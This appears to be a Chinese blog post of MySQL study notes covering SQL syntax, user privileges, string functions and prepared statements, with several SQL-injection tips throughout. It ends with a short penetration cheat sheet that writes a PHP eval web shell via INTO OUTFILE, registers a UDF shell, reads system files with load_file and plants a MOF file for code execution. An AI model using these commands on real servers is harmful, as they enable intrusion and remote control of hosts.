---
layout:  post
catalog: true 
tags:
    - Web
---



## 基础知识

### SQL语言
* 用来管理数据库中的数据
* 可以嵌套到其他语言中

### SQL的DML和DDL

可以把 SQL 分为两个部分：数据操作语言 (DML) 和 数据定义语言 (DDL)。

* 查询和更新指令构成了 SQL 的 DML 部分

```
SELECT - 从数据库表中获取数据
UPDATE - 更新数据库表中的数据
DELETE - 从数据库表中删除数据
INSERT INTO - 向数据库表中插入数据
```

* SQL 中最重要的 DDL 语句

```
CREATE DATABASE - 创建新数据库

ALTER DATABASE - 修改数据库

CREATE TABLE - 创建新表

ALTER TABLE - 变更（改变）数据库表

DROP TABLE - 删除表

CREATE INDEX - 创建索引（搜索键）

DROP INDEX - 删除索引
```



* SQL 的数据定义语言 (DDL) 部分使我们有能力创建或删除表格。我们也可以定义索引（键），规定表之间的链接，以及施加表间的约束。

### 数据控制语言

* grant语句

给用户增加权限

* revoke语句

收回用户权限

* commit语句

提交事务

* rollback语句

回滚事务

### MySQL权限级别

**权限存储在mysql库**的user, db, tables_priv, columns_priv, procs_priv这几个系统表中，待MySQL实例启动后就加载到内存中

*  全局——可以管理整个MySQL
*  库——可以管理指定的数据库
*  表——可以管理指定数据库的指定表
*  字段——可以管理指定数据库的指定表的指定字段

### MySQL目录下的文件
* bin目录

放置可执行文件，mysql.exe等

* data目录

放置日志及数据库

* include目录

放置头文件，mysql.h等

* lib目录

放置库文件

* share目录

放置字符集、语言等

* my.ini

是MySQL正在使用的配置文件

MySQL数据库使用的配置文件

* my-huge.ini
* my-template.ini

配置文件的模板

### cmd下MySQL使用

* 启动mysql服务
```
net start mysql
```

* 停止mysql服务
```
net stop mysql
```

* cmd下登录mysql
```
mysql -h 服务器地址  -u  用户名  -p 
或者
使用MySQL Command Line Client登录
```



## 数据库和表的操作
### 使用mysql
* 库名、表名需要用引号包裹
* 使用反引号：是为了区别mysql保留字和普通字符引入的符号
* 操作要记得分号结尾
* 库名、表名、字段名不区分大小写
### 常用语法

* 查看mysql支持的字符集

```
SHOW VARIABLES LIKE 'character%';
```

* 查询当前数据库版本

```
select version();
```

* 查询当前数据库

```
select database();
```

* 查询当前数据库用户

```
select user();
```

* 查看数据库文件存放的目录

```
select @@datadir;
```

* 查询服务器系统

```
select @@global.version_compile_os;
```

![alt 系统](F:\笔记\博客\文章图片\t_201111043608系统.png)

* 查询MySQL服务的安装路径

```
select @@basedir;
```



![alt 路径](F:\笔记\博客\文章图片\t_201111043602路径.png)

* 查询所有数据库名

```
show databases;
```



* 查询所有表名

```
show tables;
```



* 选择一个数据库

```
use 数据库名;
```



* 创建一个数据库

```
create database `数据库名`;
```

* 删除一个数据库

```
drop database `数据库名`;
```



* 创建一个表

```
create table 表名（字段名 数据类型 字符集）;
```



![alt 创建表](F:\笔记\博客\文章图片\t_201111035714创建表名.png)

* 查询一个表结构

```
desc 表名;
```



![alt 表结构](F:\笔记\博客\文章图片\t_201111043551表结构.png)

 

 * 修改数据库编码
```
alter database 数据库名 default character set 编码 collate 编码_bin

例：alter database test default character set gbk collate gbk_bin
```



### 数据库用户的操作

* 数据库用户名的含义

```
root@127.0.0.1
用户root的访问权限为127.0.0.1，表示root用户只支持本地访问
```

* 开启数据库外连

使某个数据库用户支持除本地IP外的所有外部IP连接

```
GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY 'password' WITH GRANT OPTION;

password是root用户的密码；代码中的 % 表示任何IP地址，如果你的IP地址固定，可以把 % 换成你的IP地址，不换也行
```

* 刷新权限

每次更新权限后记得刷新权限

```
FLUSH PRIVILEGES;
```

* 查询当前数据库用户
```
select user();
```

* 查看当前用户权限

```
show grants for '用户名'@'主机地址';
```

* 查看所有用户（用户名、给谁授权）
```
select user,host from mysql.user; 
或 
select * from mysql.user;
```

* 添加用户
```
create user 用户名@'主机地址' identified by '密码';
```

* 创建用户同时授权
```
grant all privileges on mq.* to 用户名@主机名 identified by '密码';
```

* 设置与更改用户密码
```
SET PASSWORD FOR '用户名'@'主机名' = PASSWORD('新密码');
```

* 删除用户
```
drop user 用户名@'主机地址';
```

* 给用户授权
```
grant 权限 on 数据库名.表名 to 用户名@'主机名' （在这里加上 WITH GRANT OPTION，可以使他有赋权能力）
```

* 撤销权限
```
revoke 权限 on 数据库名.表名 from '用户名'@'主机名';
```

* 切换用户

注意：不同用户的主机得是一样的，否则无法切换

```
使用命令 -u 用户名 -p 
```



### 数据表的操作
* 在操作数据表前要先指定数据库
```
use 数据库名称;
```

或

直接使用`数据库.表名`来指定数据库

```
eg：
select * from mysql.user;
```

* 查所有数据表
```
show tables;
```

* 查表中字段

```
show columns from 表名
或
show create table 表名;
或
describe 表名;
```

* 修改数据表

修改表名

```
alert table 旧表名 rename to 新表名
```

修改字段名

```
alter table 表名 change  旧字段名 新字段名 新数据类型(数据完整性约束条件)
```

修改字段的数据类型

```
alter table 表名 modify 字段名 数据类型(数据完整性约束条件);
```

添加字段

```
alter table 表名 add 新字段 数据类型(数据完整性约束条件);
```

删除字段

```
alter table 表名 drop 字段名;
```

* 删除数据表

```
drop table 表名;
```



### 数据的操作
* 添加数据

为表中字段添加数据

```
insert into 表名(字段名1,字段名2..)  values(值1,值2,..);
```

![alt 添加](F:\笔记\博客\文章图片\t_201111045551666.jpg)

为表中指定字段添加数据

```
INSERT INTO 表名
SET 字段名1=值1,字段名2=值2, ..
eg: insert into student
set id=10,name='zhangba',chengji=72;
```

![alt 添加](F:\笔记\博客\文章图片\t_201111073258另一种.jpg)

同时添加多条记录

```
insert into 表名
values(值1,值2,值3),(值1,值2,值3),(值1,值2,值3);
```

* 更新数据

利用 where控制要更新的范围

```
update 表名
SET 字段名1=值1,字段名2=值2, ..
where id=1 
```

![alt 更新](F:\笔记\博客\文章图片\t_201111045056更新.jpg)

* 删除数据

```
delete from 表名 where id=1;
```

* 单表查询

通配符

```
*  匹配任意一个或多个字符
_  匹配任意一个字符
%  匹配任意长度字符串
```

注：若匹配的字符串中有 `%`和`_ `则需要转义  `+&`或`+_`

查询所有字段

```
select * from 表名
```

查询指定字段

```
select 字段名1,字段名2 from 表名
```

条件查询

```
select 字段名1,字段名2 from 表名 where id=1;
```

* `distinct`查询

过滤掉查询记录中的重复值

```
select distinct 字段名 from 表名;
```

* 关键字查询

`in`关键字查询

`in`用来判断某个字段的值在不在指定集合中，若在则可被查询出

```
select 字段1,字段2 from 表名 where id  in (1,2,3);
```

`between and`关键字查询

`between and`关键字用来判断某个字段的值在不在指定范围内，若在则可被查询出

```
select 字段1,字段2 from 表名 where id between 2 and 4;
```

`like`关键字查询

判断两个字符串是否匹配，常用来绕过，通常可以替换`=`号

```
select 字段名1,字段名2 from 表名 where id like "c%";
select 字段名1,字段名2 from 表名 where id not like "c%";
```

`and`关键字查询

可使用多个查询条件，当多个条件同时满足时，才有结果。常用来判断是否存在注入点

```
select 字段名1,字段名2 from 表名 where id like 'c%' and id < 3;
```

`or`关键字查询

可使用多个查询条件，多个条件中有满足的即可。当`or 1=1` 时，构成永真式，会显示所有结果，不受`where`条件的制约

```
select 字段名1,字段名2 from 表名 where id like 'c%' or id < 3;
```



* `UNION`联合查询

`UNION` 操作符用于合并两个或多个`SELECT `语句的结果集

**注意**：UNION 内部的SELECT 语句必须拥有相同数量的列。且第一个 SELECT 语句中被使用的字段名称也被用于结果的字段名称。列也必须拥有相似的数据类型。同时，每条SELECT 语句中的列的顺序必须相同。

```
eg:
select version() union select id from users;

version()的查询结果是int型，且只有一列，所以 union 之后的那个select查询结果也必须只有一列，而且数据类型也需要类似 int
```

![alt 联合查询](F:\笔记\博客\文章图片\o_201206064158联合查询的列数必须相同.jpg)

* 其他查询

`COUNT()`函数：统计查询到的记录的条数

```
SELECT COUNT(字段名) FROM 表名
```

`SUM()`函数：求出表中某个字段所有值的总和

```
SELECT SUM(字段名) FROM 表名;
```

`AVG()`函数：求出表中某个字段所有值的平均值

```
SELECT AVG(字段名) FROM 表名;
```

* 空值查询 `is null`

```
select 字段1,字段2 from 表名 where id is null;
select 字段1,字段2 from 表名 where id is not null;
```



## mysql常用函数

* `concat(str1,str2 … … )` 没有分隔符的连接字符串

```
eg:
select concat(id,'-',name) from users;
则结果为 id - name 的拼接
```

![alt](F:\笔记\博客\文章图片\o_201206071251concat函数.jpg)

如果连接串中存在NULL，则返回结果为NULL

```
eg:
select concat(id,NULL,name) from users;
则结果为 NULL
```



![alt](F:\笔记\博客\文章图片\o_201206071301null.jpg)

* `concat_ws(separator,str1,str2… … )`该函数第一个参数是其他参数的分隔符，分隔符在连接字符串之间加入。分隔符可以是一个字符串，也可以是其它参数。

```
eg:
select concat_ws('-',id,name,password) from users;
则结果为 id - name - password 的拼接
```

![alt](F:\笔记\博客\文章图片\o_201206072121concat_ws.jpg)

分隔符为NULL，则返回结果为NULL

```
eg:
select concat_ws(NULL,id,name,password) from users;
则结果为 NULL
```



![alt](F:\笔记\博客\文章图片\o_201206072128ws _null.jpg)

如果参数中存在NULL，则会被忽略

```
eg:
select concat_ws('-',id,name,NULL) from users;
则结果为 id - name 的拼接
```



可用`ifNULL()`对NULL进行判断，并用其它值进行替换

```
ifNULL(a,b) 
判断a是否为NULL，若a为NULL，则返回b，否则返回a
```



```
eg:
select concat_ws('-',name,ifNULL(id,'test'),password) from users;
```

![alt](F:\笔记\博客\文章图片\o_201206072521替换null.jpg)

* `group_concat(str1,str2… … )`将**多行查询的结果**以逗号为分隔符**连接成为一行结果**。

使用场景：在注入时，由于回显位的问题，`concat() `不能一次性将多行内容展示出来，需要使用 `limit `控制挨个去显示，这时使用 `group_concat()`，可将多行内容在一行显示。

```
eg:
select group_concat(id,name,password) from users;
所有结果显示在一行
```



![alt](F:\笔记\博客\文章图片\o_201206073957group_concat.jpg)

* 截取字符串函数

`left()`

从左开始截取字符串 `left(str,length)` ，`str`要截取的字符串 `length`要截取的长度

`right()`

从右开始截取字符

`substring(str,pos,length)`

`str`被截取字段 `pos`从第几位开始截取 `length`截取长度

`substring_index(str,delim,count)`

按关键字截取字符串 

`str`被截取字段 `delim`关键字 `count`关键字出现的次数

## MySQL其他姿势（sql注入常用）

* 构造永真，爆出字段下的所有内容

```
or 1=1
eg:
select password from user where id=2 or 1=1;
```

![alt](F:\笔记\博客\文章图片\o_201214145605or 1=1.jpg)

* 当查询的值为`true`时，可正确查询

```
id =true 效果等于 id=1....
eg:
select password from user where id=true;
```



![alt](F:\笔记\博客\文章图片\o_201214145738真.jpg)

* 特殊的查询结构`id=1=(1)=1`
（该结构可以用来fuzz，只需要替换括号里的内容）
`select name from users where id=a=(b)=c`
b、c的值，只能为1或0，也可以是true或false
当b、c的值均为1或0时，等价于id=a
当b或c中有一个为0时，就会查询出，除id=a之外的字段下的其他值
![alt](F:\笔记\博客\文章图片\o_201214150213id.jpg)
![alt](F:\笔记\博客\文章图片\o_201214150623id1.jpg)
* 以1开头的字符串会被当做整型数

在mysql里面，在作布尔型判断时，以数字开头的字符串会被当做整型数。

注意：必须要有单引号括起来

![](F:%5C%E7%AC%94%E8%AE%B0%5C%E5%8D%9A%E5%AE%A2%5C%E6%96%87%E7%AB%A0%E5%9B%BE%E7%89%87%5Cmysql%E5%B8%83%E5%B0%94%E5%88%A4%E6%96%AD1.jpg)



* `select *,1`的使用 使用`select *,1 from 表名`，可以成功访问数据，使用`select 1,* from 表名`，不能正常访问数据

![](F:\笔记\博客\文章图片\select .jpg)

* 括号嵌套代替空格

```
select(name)from(users)where((id)=(2));
等价于
select name from users where id=2;
```



![](F:\笔记\博客\文章图片\括号嵌套代替空格.jpg)

## MySQL导数据

### 导出数据

将数据库导出到文件

进入cmd (注意在os cmd中 而不是在mysql中)

```
mysqldump -u 用户名 -p 数据库名 > 导出的文件名
```

### 导入数据

将`.sql`文件导入数据库

```
source  D:\ceshi.sql
```

## 预编译

### 即时 SQL

一条 SQL 在 DB 接收到最终执行完毕返回，大致的过程如下

* 词法和语义解析；

* 优化 SQL 语句，制定执行计划；

* 执行并返回结果；

如上，一条 SQL 直接是走流程处理，一次编译，单次运行，此类普通语句被称作 Immediate Statements （即时 SQL）

### 预处理 SQL

#### 介绍

绝大多数情况下，某需求某一条 SQL 语句可能会被反复调用执行，或者每次执行的时候只有个别的值不同（比如 select 的 where 子句值不同，update 的 set 子句值不同，insert 的 values 值不同）。如果每次都需要经过上面的词法语义解析、语句优化、制定执行计划等，则效率就明显不行了。
所谓**预编译语句就是将此类 SQL 语句中的值用占位符替代**，可以视为将 SQL 语句模板化或者说参数化，一般称这类语句叫Prepared Statements。

预编译语句的优势在于归纳为：一次编译、多次运行，省去了解析优化等过程

此外**预编译语句能防止 SQL 注入**

#### 语法

 prepare、execute、deallocate 统称为 PREPARE STATEMENT

```
# 定义预处理语句
PREPARE stmt_name FROM preparable_stmt;
# 执行预处理语句
EXECUTE stmt_name [USING @var_name , @var_name ...];
# 删除(释放)定义
{DEALLOCATE | DROP} PREPARE stmt_name;
```

```mysql
如
#利用字符串定义预处理 SQL (直角三角形计算)
mysql> PREPARE stmt1 FROM 'SELECT SQRT(POW(?,2) + POW(?,2)) AS hypotenuse';
Query OK, 0 rows affected (0.00 sec)
Statement prepared

mysql> SET @a = 3;
Query OK, 0 rows affected (0.00 sec)

mysql> SET @b = 4;                                                   
Query OK, 0 rows affected (0.00 sec)

mysql> EXECUTE stmt1 USING @a, @b;
+------------+
| hypotenuse |
+------------+
|          5 |
+------------+
1 row in set (0.00 sec)

mysql> DEALLOCATE PREPARE stmt1;                                     
Query OK, 0 rows affected (0.00 sec)
```

```mysql
如
#计算一个数加2的值
PREPARE stmt1 FROM 'SELECT (?+2) AS name';
SET @a = 3;
EXECUTE stmt1 USING @a;
DEALLOCATE PREPARE stmt1;
```

![](F:%5C%E7%AC%94%E8%AE%B0%5C%E5%8D%9A%E5%AE%A2%5C%E6%96%87%E7%AB%A0%E5%9B%BE%E7%89%87%5C%E9%A2%84%E7%BC%96%E8%AF%91.jpg)



#### 解决limit无法传参问题

对于 LIMIT 子句中的值，必须是常量，不得使用变量，也就是说不能使用：`SELECT * FROM TABLE LIMIT @skip, @numrows;` 如此，就可以是用 PREPARE 语句解决此问题

```mysql
mysql> SET @skip = 100; SET @numrows = 3;
Query OK, 0 rows affected (0.00 sec)

Query OK, 0 rows affected (0.00 sec)

mysql> SELECT * FROM t1 LIMIT @skip, @numrows;
ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '@skip, @numrows' at line 1

mysql> PREPARE stmt3 FROM "SELECT * FROM t1 LIMIT ?, ?";
Query OK, 0 rows affected (0.00 sec)
Statement prepared

mysql> EXECUTE stmt3 USING @skip, @numrows;
+-----+--------+
| a   | filler |
+-----+--------+
| 100 | filler |
| 101 | filler |
| 102 | filler |
+-----+--------+
3 rows in set (0.00 sec)

mysql> DEALLOCATE PREPARE stmt3;
Query OK, 0 rows affected (0.00 sec)
```



#### 预处理 SQL 使用注意点

* `stmt_name` 作为` preparable_stmt `的接收者，唯一标识，不区分大小写。
* `preparable_stmt` 语句中的 `? `是个占位符，所代表的是一个字符串，不需要将 `?` 用引号包含起来。
* 定义一个已存在的 `stmt_name` ，原有的将被立即释放，类似于变量的重新赋值。
* `PREPARE stmt_name` 的作用域是`session`级
* 预处理编译 SQL 是占用资源的，所以在使用后注意及时使用 DEALLOCATE PREPARE 释放资源，这是一个好习惯。

# 渗透常用

```
查路径：select @@basedir as basePath from dual

查用户：select * from mysql.user

注册函数：CREATE FUNCTION shell RETURNS STRING SONAME 'udf.dll'

查版本：select version();

导出：select load_file(0x633A5C5C626F6F742E696E69) FROM user into outfile 'D://a.txt'

写文件：select '<?php eval($_POST[cmd]);?>' into outfile 'F://a.php';

开外连：GRANT ALL PRIVILEGES ON . TO 'root'@'%' IDENTIFIED BY 'password' WITH GRANT OPTION;

读文件：select load_file('c:boot.ini')

移动文件：select load_file('C:/wmpub/nullevt.mof') into dumpfile 'c:/windows/system32/wbem/mof/nullevt.mof'
```

